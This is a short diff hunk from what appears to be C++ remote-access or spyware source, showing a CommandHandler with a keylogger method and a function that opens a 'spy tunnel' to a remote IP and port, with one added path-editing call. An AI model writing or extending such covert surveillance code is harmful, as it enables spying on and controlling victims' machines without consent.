@@ -412,6 +412,7 @@ void CommandHandler::keylogger() {
 
 void CommandHandler::handle_tunnelt(Tunnel* __p_tunnel) {
     if (__p_tunnel->p_spy_tunnel_->init(*p_ip_, port_, __p_tunnel->p_tunnel_shutdown_fd_, TCP_BASED) == 0) {
+        __p_tunnel->p_spy_tunnel_->edit_path(__p_tunnel->client_index_, __p_tunnel->command_code_);
         Tunnel::active_tunnels_++;
         __p_tunnel->p_spy_tunnel_->run();
     }
